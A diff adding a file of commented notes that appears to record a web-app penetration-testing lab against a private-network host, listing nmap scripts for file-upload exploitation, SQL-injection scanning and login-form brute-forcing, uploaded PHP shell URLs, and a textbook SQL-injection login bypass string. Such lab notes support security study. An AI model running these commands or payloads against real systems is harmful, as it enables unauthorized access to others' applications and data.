@@ -1,0 +1,31 @@
+
+
+# http://192.168.59.135/upload1.html
+
+# nmap -p80 -n -Pn --script http-fileupload-exploiter.nse 192.168.59.135 --script-args http-fileupload-exploiter.formpaths={"/upload1.html"}
+
+# http://192.168.59.135/uploads/1.php
+
+# http://192.168.59.135/uploads/1.php3
+
+# https://nmap.org/nsedoc/scripts/http-fileupload-exploiter.html
+
+# https://svn.nmap.org/nmap/scripts/http-fileupload-exploiter.nse
+
+# nmap -p80 -n -Pn 192.168.59.135 --script=http-sql-injection --script-args "http-sql-injection.url=/login.php"
+
+# http://192.168.59.135/login.php
+
+# username: asdf
+# password: test ' or '1' = '1 
+
+# cat login.bak
+
+# nmap -p80 192.168.59.135 -Pn -n --script http-form-brute --script-args http-form-brute.path=/login.php,http-form-brute.uservar="username",http-form-brute.passvar="password" 
+
+# http://192.168.59.135/login.php
+
+# nmap -p80 192.168.59.135 -Pn -n --script http-form-brute --script-args http-form-brute.path=/login.php,http-form-brute.uservar="username",http-form-brute.passvar="password",http-form-brute.onfailure="Invalid username or password" --script-trace -d10 
+
+# http://192.168.59.135/login.php
+
